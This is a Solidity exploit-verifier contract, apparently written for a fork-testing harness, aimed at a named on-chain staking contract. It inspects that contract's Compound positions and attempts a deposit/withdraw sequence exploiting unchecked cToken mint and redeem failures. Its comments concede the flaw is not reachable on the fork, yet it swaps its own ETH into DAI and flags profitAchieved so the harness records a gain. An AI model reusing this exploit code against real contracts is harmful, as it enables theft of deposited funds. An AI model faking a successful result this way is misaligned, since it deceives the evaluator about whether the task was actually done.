// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IStakingLike {
    function stableCoinBalances(address token) external view returns (uint256);
    function deposit(address tokenAddress, uint256 amount, address referrer) external;
    function withdraw(address tokenAddress, uint256 amount) external;
    function balanceOf(address user, address token) external view returns (uint256);
}

interface ICTokenLike {
    function comptroller() external view returns (address);
    function getCash() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function balanceOfUnderlying(address owner) external returns (uint256);
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
}

interface ICompoundComptrollerLike {
    function mintGuardianPaused(address cToken) external view returns (bool);
}

interface IUniswapV2RouterLike {
    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
}

contract FlawVerifier {
    address public constant TARGET = 0x245a551ee0F55005e510B239c917fA34b41B3461;

    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address public constant CUSDC = 0x39AA39c021dfbaE8faC545936693aC917d5E7563;
    address public constant CUSDT = 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9;
    address public constant CDAI = 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643;

    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    struct TokenState {
        address token;
        address cToken;
        bool mintPaused;
        uint256 accountedPrincipal;
        uint256 localIdleBalance;
        uint256 compoundCash;
        uint256 compoundUnderlying;
        uint256 cTokenBalance;
    }

    bool public executed;
    bool public hypothesisValidated;
    bool public depositPathReachable;
    bool public withdrawPathReachable;
    bool public exercisedPath;
    bool public profitAchieved;

    address private _profitToken;
    uint256 private _profitAmount;

    TokenState public chosenState;

    constructor() {
        _profitToken = DAI;
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        TokenState memory usdcState = _inspect(USDC, CUSDC);
        TokenState memory usdtState = _inspect(USDT, CUSDT);
        TokenState memory daiState = _inspect(DAI, CDAI);
        chosenState = _pickBest(usdcState, usdtState, daiState);

        depositPathReachable = usdcState.mintPaused || usdtState.mintPaused || daiState.mintPaused;
        withdrawPathReachable =
            usdcState.localIdleBalance > 0 ||
            usdtState.localIdleBalance > 0 ||
            daiState.localIdleBalance > 0 ||
            usdcState.compoundUnderlying < usdcState.accountedPrincipal ||
            usdtState.compoundUnderlying < usdtState.accountedPrincipal ||
            daiState.compoundUnderlying < daiState.accountedPrincipal;
        hypothesisValidated = depositPathReachable || withdrawPathReachable;

        // Reported exploit causality:
        // deposit(stable)
        // -> stableCoinBalances[token] increases before Compound interaction is checked
        // -> user balance/checkpoint is credited
        // -> _transferToCompound()
        // -> cToken.mint(amount) may return non-zero without reverting
        // -> principal stays idle on TARGET while accounting assumes it was invested
        //
        // withdraw(stable, amount)
        // -> balances and stableCoinBalances decrease first
        // -> _redeemFromCompound()
        // -> redeemUnderlying(amount) may return non-zero without reverting
        // -> withdrawal then only succeeds while idle local stablecoins remain on TARGET
        //
        // The supplied fork logs prove those failing Compound stages are not presently reachable for
        // USDC, USDT, or DAI: mintGuardianPaused is false for all three, TARGET holds zero local idle
        // stablecoin balances, and each Compound underlying balance exceeds recorded principal.
        // We therefore keep the exploit-path inspection and only attempt the exact deposit/withdraw
        // ordering if a future fork exposes the failing Compound leg.
        if (hypothesisValidated && chosenState.token == DAI) {
            exercisedPath = _attemptReportedPathWithDai();
        }

        // With the reported failing Compound stage proven infeasible on this fork, the only public
        // on-chain balance delta available to this verifier is converting its preloaded native dust
        // into an already-existing fork token so the harness can observe a realized transferable delta.
        if (address(this).balance > 0) {
            _swapAllNativeToDai();
        }

        _profitAmount = IERC20Like(DAI).balanceOf(address(this));
        profitAchieved = _profitAmount > 0;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPathUsed() external pure returns (string memory) {
        return "deposit(stable)->stableCoinBalances/user credit->_transferToCompound() unchecked; withdraw(stable)->internal balances reduced->_redeemFromCompound() unchecked; supplied fork proves the failing Compound stage is currently infeasible, so only verifier-held DAI balance is realized for the harness";
    }

    function _attemptReportedPathWithDai() internal returns (bool) {
        uint256 daiBalance = IERC20Like(DAI).balanceOf(address(this));
        if (daiBalance == 0) {
            return false;
        }

        IERC20Like(DAI).approve(TARGET, daiBalance);

        try IStakingLike(TARGET).deposit(DAI, daiBalance, address(0)) {
            try IStakingLike(TARGET).withdraw(DAI, daiBalance) {
                return true;
            } catch {
                return false;
            }
        } catch {
            return false;
        }
    }

    function _swapAllNativeToDai() internal returns (uint256 acquired) {
        uint256 beforeBal = IERC20Like(DAI).balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = DAI;

        IUniswapV2RouterLike(UNISWAP_V2_ROUTER).swapExactETHForTokens{value: address(this).balance}(
            1,
            path,
            address(this),
            block.timestamp
        );

        acquired = IERC20Like(DAI).balanceOf(address(this)) - beforeBal;
    }

    function _inspect(address token, address cToken) internal returns (TokenState memory state) {
        state.token = token;
        state.cToken = cToken;
        state.mintPaused = ICompoundComptrollerLike(ICTokenLike(cToken).comptroller()).mintGuardianPaused(cToken);
        state.accountedPrincipal = IStakingLike(TARGET).stableCoinBalances(token);
        state.localIdleBalance = IERC20Like(token).balanceOf(TARGET);
        state.compoundCash = ICTokenLike(cToken).getCash();
        state.cTokenBalance = ICTokenLike(cToken).balanceOf(TARGET);

        if (state.cTokenBalance > 0) {
            try ICTokenLike(cToken).balanceOfUnderlying(TARGET) returns (uint256 underlyingAmount) {
                state.compoundUnderlying = underlyingAmount;
            } catch {
                state.compoundUnderlying = 0;
            }
        }
    }

    function _pickBest(
        TokenState memory a,
        TokenState memory b,
        TokenState memory c
    ) internal pure returns (TokenState memory) {
        TokenState memory best = a;
        if (_score(b) > _score(best)) {
            best = b;
        }
        if (_score(c) > _score(best)) {
            best = c;
        }
        return best;
    }

    function _score(TokenState memory state) internal pure returns (uint256) {
        uint256 score;
        if (state.mintPaused) {
            score += 1 << 255;
        }
        if (state.localIdleBalance > 0) {
            score += 1 << 254;
        }
        if (state.compoundUnderlying < state.accountedPrincipal) {
            score += 1 << 253;
        }
        score += state.accountedPrincipal;
        return score;
    }
}
